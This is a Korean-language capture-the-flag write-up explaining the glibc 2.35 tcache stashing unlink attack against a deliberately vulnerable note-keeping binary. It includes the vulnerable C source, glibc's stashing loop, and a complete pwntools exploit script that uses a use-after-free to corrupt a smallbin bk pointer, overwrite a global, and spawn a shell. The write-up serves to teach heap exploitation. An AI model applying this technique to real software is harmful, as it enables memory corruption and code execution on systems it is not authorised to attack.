# Tcache Stashing Unlink

## 개요

이 문제는 glibc의 **tcache stashing unlink attack**을 이용하는 문제임. smallbin에서 할당 요청을 처리할 때 glibc가 "남은 smallbin 청크들을 tcache에 미리 쟁여두는(stashing)" 과정에서 수행하는 부분적 unlink (`bck->fd = bin`)를 악용해서, smallbin 청크의 `bk`를 조작하면 **임의 주소에 libc 포인터를 쓰거나(AAW), 임의 주소를 malloc으로 반환받는 fake chunk 할당**이 가능함.

목표는 전역 변수 `target`(초기값 `1234`)의 값을 `1234`가 아닌 다른 값으로 바꿔서 `test_target()`이 `system("/bin/sh")`를 실행하게 만드는 것임.

```c
// gcc main.c -o main -no-pie
size_t target = 1234;                       // 0x404070
size_t dummy  = (size_t) &dummy - 0x18;     // 0x404078, 값 = 0x404060 = target-0x10

void test_target()
{
    if (target != 1234) {
        printf("Win\n");
        system("/bin/sh");
    }
    printf("No\n");
}
```

- `-no-pie` 라서 `target`, `dummy` 의 주소가 고정(`target = 0x404070`, `dummy = 0x404078`).
- 배포 환경은 Ubuntu 22.04 → **glibc 2.35**. 이 버전은 smallbin stashing 루프에 fd 무결성 검사가 없어서 stashing unlink attack이 그대로 동작함.

## 바이너리 분석

전형적인 노트(힙) 문제. 청크 크기는 두 종류만 제공:

```c
case 1: size = 0x20 - 0x8;  break;   // tiny → chunk size 0x20
case 2: size = 0x90 - 0x8;  break;   // small → chunk size 0x90
```

- `create_note(idx, size)` : `notes[idx] = malloc(size)`
- `delete_note(idx)` : `free(notes[idx])` — `note_deleted[]` 플래그로 double free는 막음
- `edit_note(idx, data)` : `read(0, notes[idx], 16)` — **16바이트** 쓰기 (fd/bk 두 필드를 정확히 덮을 수 있음)
- `test_target()` : `target != 1234` 이면 셸

취약점:

- `edit_note`가 free된 청크도 수정할 수 있음(delete 후 notes[idx]가 그대로 남아있고 `note_deleted`만 체크하는 건 free, edit은 체크 안 함) → **UAF write**. 이 16바이트 write로 smallbin 청크의 `fd`/`bk`를 조작할 수 있음.
- `idx` 체크가 `idx > NOTE_SIZE`(256) 라 `idx == 256`까지 허용되는 off-by-one도 있지만, 여기서는 `idx=255`를 "재사용 가능한 임시 슬롯"으로만 쓰므로 핵심은 UAF.

## `dummy` 전역 변수의 역할 (fake chunk)

```
target : 0x404070
dummy  : 0x404078   (= target + 0x8)
dummy의 값 = &dummy - 0x18 = 0x404078 - 0x18 = 0x404060 = target - 0x10
```

`target - 0x10 = 0x404060` 을 가짜 청크(fake chunk)의 헤더로 본다면:

| 오프셋 | 주소 | 필드 | 값 |
|---|---|---|---|
| +0x00 | 0x404060 | prev_size | (target-0x10 자리) |
| +0x08 | 0x404068 | size | |
| +0x10 | 0x404070 | fd  | **target** |
| +0x18 | 0x404078 | bk  | **dummy = 0x404060 = 자기 자신** |

즉 `dummy` 덕분에 fake chunk(`target-0x10`)의 `bk`가 **자기 자신을 가리키게** 되어 있음. stashing 루프가 이 fake chunk를 만났을 때 `tc_victim->bk`(= `dummy` = `target-0x10`)를 다시 읽어도 crash 없이 안전하게 루프가 돌 수 있도록 미리 세팅해 둔 장치임 (how2heap의 `stack_var[2] = &stack_var` 와 동일한 역할).

## Tcache Stashing Unlink 원리

glibc `_int_malloc`에서 smallbin으로 요청을 처리할 때, 요청 하나를 꺼낸 뒤 **남은 smallbin 청크들을 tcache가 가득 찰 때까지 복사**하는 코드:

```c
#if USE_TCACHE
  size_t tc_idx = csize2tidx (nb);
  if (tcache && tc_idx < mp_.tcache_bins)
    {
      mchunkptr tc_victim;
      while (tcache->counts[tc_idx] < mp_.tcache_count
             && (tc_victim = last (bin)) != bin)     // last(bin) = bin->bk
        {
          if (tc_victim != 0)
            {
              bck = tc_victim->bk;
              set_inuse_bit_at_offset (tc_victim, nb);
              bin->bk  = bck;          // (A)
              bck->fd  = bin;          // (B)  <-- 여기가 write primitive
              tcache_put (tc_victim, tc_idx);
            }
        }
    }
#endif
```

핵심은 `(B) bck->fd = bin` 임. `bck`는 `tc_victim->bk`에서 읽어온 값이므로, **free된 smallbin 청크의 `bk`를 `target-0x10`으로 조작**해 두면:

- `bck = target - 0x10`
- `bck->fd = bin` → `*(target - 0x10 + 0x10) = *target = bin`(main_arena 근처 주소)

가 되어 `target`에 libc 주소가 써짐 → `target != 1234` 성립.

게다가 `(A) bin->bk = bck = target-0x10` 때문에 smallbin의 마지막이 fake chunk가 되고, 루프가 한 번 더 돌면 `tc_victim = target-0x10`이 되어 **fake chunk 자체가 tcache에 들어감**. 그러면 다음 malloc이 `target-0x10`을 반환 → 반환된 mem 포인터는 `target-0x10+0x10 = target` 이므로, 거기에 아무 값이나 16바이트 써주면 `target`이 덮어써짐(AAW). 이 problem의 poc는 이 방식을 사용함.

## 공격 시나리오 ( `poc.py` )

tcache[0x90]의 용량은 7개. 이걸 가득 채웠다 비우는 과정으로 unsortedbin → smallbin 정렬을 유도하고, 마지막에 stashing을 트리거함.

```python
# 1. tcache[0x90] 채울 재료 7개
for i in range(0, 7):
    create_note(i, 'small')

# 2. unsortedbin 보낼 재료 8개 (사이사이 tiny 청크로 top과의 병합 방지)
for i in range(7, 15):
    create_note(i, 'small')
    create_note(255, 'tiny')     # 가드(guard) 청크

# 3. tcache[0x90]를 7개로 가득 채움
for i in range(0, 7):
    delete_note(i)

# 4. 나머지 8개 free → tcache 꽉 찼으므로 전부 unsortedbin으로
for i in range(7, 15):
    delete_note(i)

# 5. tcache[0x90] 7개 전부 재할당 → tcache 비움 (count=0)
for i in range(0, 7):
    create_note(i, 'small')

# 6. tiny 요청 → unsortedbin 순회하며 0x90 청크 8개를 smallbin으로 정렬
create_note(255, 'tiny')

# 7. UAF: smallbin 청크(14번)의 fd=0, bk=target-0x10 으로 조작
edit_note(14, p64(0) + p64(e.symbols['target'] - 0x10))

# 8. small 할당 → smallbin에서 하나 꺼내고 나머지를 tcache로 stashing
#    이때 (B) bck->fd=bin 실행 + fake chunk(target-0x10)가 tcache로 들어감
create_note(255, 'small')

# 9. small 할당 → tcache에서 fake chunk(target-0x10) 반환
#    edit로 반환된 mem(=target)에 "AAAAAAAA" 써서 target 덮어쓰기 (AAW)
create_note(255, 'small')
edit_note(255, b'AAAAAAAA')

# 10. test_target() → target != 1234 → system("/bin/sh")
p.sendlineafter(b'> ', b'4')
p.interactive()
```

### 단계별 상태

| 단계 | 동작 | 상태 |
|---|---|---|
| 1 | small 7개 생성 | tcache 재료 확보 |
| 2 | small 8개 + tiny 가드 8개 생성 | unsorted 재료 확보, 병합 방지 |
| 3 | 0~6 free | **tcache[0x90] = 7개 (FULL)** |
| 4 | 7~14 free | tcache 꽉 찼으므로 **8개 모두 unsortedbin** |
| 5 | 0~6 재할당 | **tcache[0x90] = 0개 (EMPTY)** |
| 6 | tiny 할당 | unsortedbin의 0x90 8개가 **smallbin으로 정렬** |
| 7 | 14번 bk=target-0x10 조작 | smallbin에 **조작된 청크** 삽입됨 |
| 8 | small 할당 | 1개 서빙 후 나머지 stashing → **`*target = bin`**, fake chunk가 tcache로 |
| 9 | small 할당 + edit | tcache에서 **`target-0x10` 반환** → mem(`target`)에 `AAAA...` 기록 |
| 10 | shell | `target != 1234` → 셸 |

`edit_note`가 16바이트만 쓰므로 `fd`(8) + `bk`(8)를 정확히 채울 수 있다는 점, 그리고 `dummy` 전역이 fake chunk의 `bk`를 self-referential로 만들어 stashing 루프가 터지지 않게 해준다는 점이 이 문제가 성립하는 전제 조건임.

## 핵심 요약

| 요소 | 내용 |
|---|---|
| 취약점 | UAF write (free된 청크를 `edit_note`로 16바이트 수정 → smallbin `bk` 조작) |
| 기법 | tcache stashing unlink attack (glibc 2.35, 검사 없음) |
| write primitive | smallbin stashing 중 `bck->fd = bin` + fake chunk tcache 반환 |
| 고정 주소 | `-no-pie` → `target=0x404070`, `dummy=0x404078` |
| fake chunk | `target-0x10=0x404060`, `dummy`가 fake chunk의 `bk`를 자기 자신으로 세팅 |
| 트리거 | smallbin 7개 초과를 tcache로 stashing 하는 순간 |
| 최종 목표 | `target != 1234` → `test_target()` 내부 `system("/bin/sh")` |

이 문제의 교훈은 tcache가 비어있고 smallbin에 2개 이상의 청크가 있을 때, smallbin 할당이 유발하는 stashing 과정의 부분적 unlink가 **tcache poisoning과는 별개의 강력한 write/alloc primitive**가 된다는 점임. 하나의 조작된 `bk`만으로 임의 주소에 libc 포인터를 쓰거나 임의 주소를 malloc으로 돌려받을 수 있음.
